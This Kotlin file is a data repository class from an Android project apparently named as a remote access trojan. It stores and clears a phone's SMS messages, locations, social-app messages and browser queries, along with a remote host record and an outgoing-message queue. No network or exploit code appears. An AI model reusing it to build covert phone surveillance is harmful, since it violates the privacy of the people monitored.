package ug.hix.ratcomet

import android.content.Context
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.runBlocking
import ug.hix.ratcomet.database.CometDatabase
import ug.hix.ratcomet.model.*
import ug.hix.ratcomet.util.CometUtil


class Repository(context: Context?) {
    private val dbInstance = CometDatabase.dbInstance(context)
    private val cometDao = dbInstance.databaseDao()
    fun getLastSavedMsg(contact: String) : SocialApp? = cometDao.getLastMessage(contact)

    fun getFirstSavedMsg(contact: String) : SocialApp? = cometDao.getFirstMessage(contact)


    fun getSmsList() : List<SmsModel> = cometDao.getSmsList()

    fun getLastKnownLocation() : List<LocationModel> = cometDao.getLastKnownLocation()

    fun getHost() : HostModel? = runBlocking(Dispatchers.IO) { cometDao.getHost()}

    fun insertHost(host: HostModel) = runBlocking(Dispatchers.IO) {cometDao.insertHost(host)}

    fun getInitialConn() : InitialConn? =  cometDao.getInitialConn()

    fun insertInitialConn(info: InitialConn) = runBlocking(Dispatchers.IO) { cometDao.insertInitialConn(info)}

    fun insertBrowserQuery(query: BrowserModel) = runBlocking(Dispatchers.IO){cometDao.insertBrowserQuery(query)}

    fun insertSms(sms: SmsModel) = runBlocking(Dispatchers.IO) { cometDao.insertSms(sms) }

    fun insertSocialMsg(msgs: List<SocialApp>) = cometDao.insertSocialMsg(msgs)

    fun insertLocation(loc: LocationModel) = runBlocking(Dispatchers.IO){cometDao.insertLocation(loc)}

    fun deleteLocation(locList: List<LocationModel>) = cometDao.removeLocation(locList)

    fun deleteBrowserQuery() = runBlocking(Dispatchers.IO) {
        cometDao.deleteBrowserQuery(CometUtil.currentDateTime())
    }

    fun deleteSms(sms: List<SmsModel>) = cometDao.deleteSms(sms)

    fun insertSocialSend(msgs: List<SocialApp>) = cometDao.insertSocialSend(msgs)

    fun deleteSocialSend(msgs: List<SocialAppS>) = cometDao.deleteSocialSend(msgs)

    fun getSocialSend() : List<SocialAppS> = cometDao.getSocialSend()

    fun updateValidity() = cometDao.updateValidity()

    fun clearAllSms() = cometDao.clearAllSms()

    fun clearAllSocialMsg() = cometDao.clearAllSocialMsg()

    fun clearAllLocations() = cometDao.clearAllLocations()
}